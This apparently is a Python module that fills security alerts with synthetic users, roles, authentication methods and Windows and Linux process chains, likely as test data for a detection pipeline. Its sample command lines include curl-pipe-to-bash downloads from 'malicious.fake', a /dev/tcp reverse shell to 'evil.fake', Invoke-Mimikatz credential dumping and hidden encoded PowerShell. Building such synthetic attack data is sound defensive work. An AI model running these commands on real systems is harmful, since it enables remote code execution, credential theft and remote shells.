import logging
import random
from typing import List, Optional

from parsers.normalizer import UnifiedAlert

logger = logging.getLogger(__name__)

_USERS = [
    "jdoe", "asmith", "mwilson", "klee", "tpark", "lchen",
    "rjones", "ablack", "sgarcia", "pwhite",
    "admin_svc", "backup_svc", "monitor_svc", "deploy_svc",
    "sql_svc", "web_svc", "svc_acct_01", "svc_acct_02",
]

_USER_ROLES = {
    "jdoe": "developer", "asmith": "sysadmin", "mwilson": "analyst",
    "klee": "executive", "tpark": "developer", "lchen": "finance",
    "rjones": "developer", "ablack": "hr", "sgarcia": "sales",
    "pwhite": "devops", "admin_svc": "service_account",
    "backup_svc": "service_account", "monitor_svc": "service_account",
    "deploy_svc": "service_account", "sql_svc": "service_account",
    "web_svc": "service_account", "svc_acct_01": "service_account",
    "svc_acct_02": "service_account",
}

_PROCESS_CHAINS_WINDOWS = [
    ("powershell.exe", "explorer.exe", "-enc SQBFAFgA",
     "High", False, "cmd.exe", "Medium"),
    ("cmd.exe", "explorer.exe", "net user /add", "High", False, "cmd.exe", "Medium"),
    ("svchost.exe", "services.exe", "-k netsvcs", "System", True, "services.exe", "System"),
    ("chrome.exe", "explorer.exe", "--type=renderer", "Medium", True, "explorer.exe", "Medium"),
    ("python.exe", "cmd.exe", "script.py --deploy", "Medium", False, "cmd.exe", "Medium"),
    ("wmic.exe", "cmd.exe", "process call create", "High", True, "cmd.exe", "High"),
    ("schtasks.exe", "cmd.exe", "/create /tn Update", "High", False, "cmd.exe", "High"),
    ("rundll32.exe", "svchost.exe", "javascript:..", "High", False, "svchost.exe", "High"),
    ("regsvr32.exe", "cmd.exe", "/s /u /i:http", "High", False, "cmd.exe", "High"),
    ("mshta.exe", "explorer.exe", "javascript:", "High", False, "cmd.exe", "Medium"),
    ("wuauclt.exe", "svchost.exe", "/detectnow /updatenow", "System", True, "svchost.exe", "System"),
    ("msiexec.exe", "services.exe", "/i package.msi", "System", True, "services.exe", "System"),
    ("taskmgr.exe", "explorer.exe", "", "Medium", True, "explorer.exe", "Medium"),
    ("mmc.exe", "explorer.exe", "gpedit.msc", "Medium", True, "explorer.exe", "Medium"),
    ("notepad.exe", "explorer.exe", "C:\\Users\\jdoe\\readme.txt", "Low", True, "explorer.exe", "Medium"),
]

_PROCESS_CHAINS_LINUX = [
    ("bash", "sshd", "curl -s http://malicious.fake/scan.sh | bash",
     "Medium", False, "sshd", "Medium"),
    ("python3", "bash", "/opt/app/deploy.py --env prod",
     "Medium", False, "bash", "Medium"),
    ("sshd", "systemd", "sshd: root@pts/0", "High", True, "systemd", "Root"),
    ("nginx", "systemd", "worker process", "Low", True, "systemd", "Root"),
    ("cron", "systemd", "/usr/bin/backup.sh", "Medium", True, "systemd", "Root"),
    ("java", "bash", "-jar app.jar --spring.profiles=prod",
     "Medium", True, "bash", "Medium"),
    ("docker", "bash", "container run -it ubuntu bash",
     "High", True, "bash", "Root"),
    ("kubelet", "systemd", "--config=/var/lib/kubelet/config.yaml",
     "Low", True, "systemd", "Root"),
    ("sudo", "bash", "sudo -u root /opt/agent/install.sh",
     "High", False, "bash", "Root"),
    ("tmux", "sshd", "new-session -s pentest",
     "Medium", False, "sshd", "Medium"),
    ("rsync", "bash", "--archive --delete /data/ /backup/",
     "Low", True, "bash", "Medium"),
    ("wget", "bash", "https://packages.example.com/agent.deb",
     "Low", True, "bash", "Medium"),
    ("mysql", "bash", "mysqld --defaults-file=/etc/my.cnf",
     "Low", True, "bash", "Root"),
    ("sshd", "systemd", "Accepted publickey for root",
     "High", True, "systemd", "Root"),
    ("systemd-journal", "systemd", "/var/log/journal/",
     "Low", True, "systemd", "Root"),
]

_AUTH_METHODS = ["password", "kerberos", "certificate", "MFA_push",
                 "MFA_sms", "smartcard", "SSO_SAML", "API_token",
                 "SSH_key", "biometric"]


def add_identity_context(alerts: List[UnifiedAlert],
                         seed: Optional[int] = None) -> List[UnifiedAlert]:
    rng = random.Random(seed)
    for alert in alerts:
        username = rng.choice(_USERS)
        alert.src_user = username
        alert.user_role = _USER_ROLES.get(username, "standard_user")
        alert.mfa_used = rng.random() < 0.65
        alert.authentication_method = rng.choice(_AUTH_METHODS)

        is_windows = rng.random() < 0.55
        chains = _PROCESS_CHAINS_WINDOWS if is_windows else _PROCESS_CHAINS_LINUX
        proc, parent, cmd, integrity, signed, parent_proc, il = rng.choice(chains)

        alert.process_name = proc
        alert.parent_process = parent_proc
        alert.command_line = cmd
        alert.integrity_level = il
        alert.signed_binary = signed
        alert.process_hash = f"SHA256-{rng.randint(0, 0xFFFFFFFFFFFFFFFF):016x}{rng.randint(0, 0xFFFFFFFFFFFFFFFF):016x}"

        if alert.attack_type in ("malware", "privilege_escalation", "lateral_movement"):
            alert.process_name = rng.choices(
                ["powershell.exe", "cmd.exe", "wmic.exe", "rundll32.exe",
                 "bash", "python3", "curl", "wget"],
                weights=[3, 2, 1, 1, 2, 2, 1, 1], k=1
            )[0]
            alert.command_line = rng.choice([
                "-enc SQBFAFgA", "Invoke-Mimikatz -DumpCreds",
                "process call create \"cmd.exe /c net localgroup Administrators\"",
                "curl -s http://malicious.fake/loader.sh | bash",
                "powershell -w hidden -ep bypass -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwA=",
                "bash -c 'exec bash -i &>/dev/tcp/evil.fake/443 <&1'",
            ])
            alert.integrity_level = "High"
            alert.signed_binary = False
            alert.process_hash = f"SHA256-{rng.randint(0, 0xFFFFFFFFFFFFFFFF):016x}{rng.randint(0, 0xFFFFFFFFFFFFFFFF):016x}"

    return alerts
